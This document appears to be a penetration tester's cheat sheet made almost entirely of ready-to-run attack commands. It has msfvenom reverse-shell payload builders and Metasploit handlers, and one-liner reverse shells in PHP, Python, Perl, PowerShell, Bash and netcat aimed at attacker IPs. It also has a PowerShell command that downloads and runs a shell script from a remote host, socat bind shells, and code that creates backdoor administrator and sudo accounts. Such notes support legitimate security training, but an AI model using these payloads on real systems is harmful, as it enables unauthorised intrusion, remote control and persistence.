# The cheap way

1. Build payload and launch handler according to https://pentest.ws/tools/venom-builder 
> Warning: Use `windows/shell_reverse_tcp`, because `windows/shell/reverse_tcp` is a staged payload.

TCP reverse shell tested
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.197 LPORT=4446 -e cmd/powershell_base64 NOEXIT -f exe -o test.exe
```

BAT reverse shell tested
```bash
msfvenom -p cmd/windows/reverse_powershell LHOST=192.168.45.197 LPORT=4446 -o revshell.ps1
```

```bash
msfconsole -x "use exploit/multi/handler; set PAYLOAD cmd/windows/reverse_powershell; set LHOST 192.168.45.197; set LPORT 4446; run"
```

EXE reverse shell tested
```bash
msfvenom -p windows/powershell_reverse_tcp LHOST=192.168.45.197 LPORT=4446 -f exe -o revshell.exe
```

PowerShell reverse shell tested
```bash
msfvenom -p windows/powershell_reverse_tcp LHOST=192.168.45.197 LPORT=4446 NOEXIT -f raw -o revshell.ps1
```
> Important: Do not use the file but instead the powershell command it incorporates within a whole lot of gibberish

Encode payload
```bash
msfvenom --payload $payload LHOST=$hip LPORT=$hport --format psh | msfvenom --payload - --platform win --arch x86 --encoder base64 NOEXIT SYSWOW64
```

# The manual way

[Shell Folder](file:////home/kali/Documents/shells/)

## Determine compatibility
Linux:
```bash
whoami;echo ----------;bash --version;echo ----------;which nc;echo ----------;python --version;echo ----------;php --version;echo ----------;perl --version
```
## Universal

PHP (`php -r ''`)
```php
$sock=fsockopen("$hip",$hport);exec("/bin/sh -i <&3 >&3 2>&3");
```
Python (`python -c ''`)
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$hip",$hport));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
Perl (`perl -e ''`)
```perl
use Socket;$i="$hip";$p=$hport;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};
```
Meterpreter
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$ip LPORT=$port --platform windows -a x64 -f exe -o mp.exe
```

https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
https://www.revshells.com/
https://bernardodamele.blogspot.com/2011/09/reverse-shells-one-liners.html

## Windows

Invoke-PowershellTcp.ps1
```powershell
powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.197:8000/Invoke-PowershellTcp.ps1'); Invoke-PowershellTcp -Reverse -IPAddress 192.168.45.197 -Port 4444"
```
Bind
```powershell
ncat.exe -lknv --allow $hip -e "cmd.exe" 4545
```
NC
```powershell
ncat.exe $hip $hport -e "cmd /c (cmd 2>&1)"
```
CMD2PS
```powershell
powershell.exe -nop -NoExit -NonInteractive -EP Bypass -c "\inetpub\wwwroot\Invoke-PowsershellTcp.ps1 -Reverse -IPAddress $hip -Port $hport"
```
PS
```powershell
powershell -nop -exec bypass -c "$client = New-Object System.Net.Sockets.TCPClient('$hip',$hport);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '>';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```


## Linux

Bash
```bash
bash -i >& /dev/tcp/$hip/$hport 0>&1
```
NC v1
```bash
nc -e /bin/sh $hip $hport
```
NC v2
```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $hip $hport >/tmp/f
```


## Upgrades

Perl
```perl
perl -e 'exec "/bin/bash";'
```
Bash
```bash
echo os.system('/bin/bash')
```
Python
```python
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
Socat (https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat)
```bash
socat file:`tty`,raw,echo=0 tcp-listen:4445
```

```bash
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:192.168.45.182:4445
```

Encrypted Socat
- Create certificate
   ```bash
openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days 362 -out bind_shell.crt && cat bind_shell.key bind_shell.crt > bind_shell.pem
```
- Open Listener
```bash
sudo socat OPENSSL-LISTEN:443,cert=bind_shell.pem,verify=0,fork EXEC:/bin/bash
```
- Connect to it via the target machine
```bash
socat - OPENSSL:$ip:443,verify=0
```

tty
```bash
nc -lvnp 4444&
```

```bash
echo $TERM && stty -a && stty raw -echo
```

`fg` and `reset`

```bash
export SHELL=bash
export TERM=xterm256-color
stty rows 38 columns 116
```
(adjust according to the information colleted above)


## Fixes
Check wheter we are in CMD or Powershell
```
(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell
```
Check if `bash` is interactive
```bash
[[ $- == *i* ]] && echo 'Interactive' || echo 'Not interactive'
```
Check if `PS` is interactive
```powershell
[Environment]::GetCommandLineArgs()
```

Fix Output
```bash
stty raw -echo
```
Set TERM
```bash
export TERM=xterm
```
Get Window Size
```bash
stty size
```
Fix Window Size
```bash
stty rows X cols Y
```
Fix PATH
```bash
export PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```
Add colors
```bash
export TERM=xterm-256color
```
Reload bash
```bash
exec /bin/bash
```


# Create Admin-User

##### Windows
```c
#include <stdlib.h>

int main ()
{
  int i;
  
  i = system ("net user dave2 password123! /add");
  i = system ("net localgroup administrators dave2 /add");
  
  return 0;
}
```
(See [[8_crosscompile2windows_guide]])
##### Linux
```bash
sudo adduser --system --shell /bin/bash --no-create-home us3r && echo -e 'Testp4ssw0rd\nTestp4ssw0rd' | sudo passwd us3r && sudo usermod -aG sudo us3r
```